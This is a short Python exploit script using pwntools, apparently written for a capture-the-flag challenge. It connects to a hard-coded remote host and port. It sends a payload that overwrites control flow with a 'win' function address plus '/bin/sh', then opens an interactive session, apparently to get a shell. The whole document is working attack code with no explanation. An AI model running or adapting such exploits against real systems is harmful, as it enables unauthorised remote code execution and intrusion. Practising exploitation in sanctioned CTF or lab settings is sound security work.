from pwn import *

HOST = '34.159.240.221'
PORT = 31416

exe = './main'
elf = ELF(exe)
context.binary = elf

p = connect(HOST,PORT)

win_function = 0x4011b6
payload = p64(win_function) + b"/bin/sh\x00"

p.recvuntil(b'please input something')
p.sendline(payload)

p.interactive()
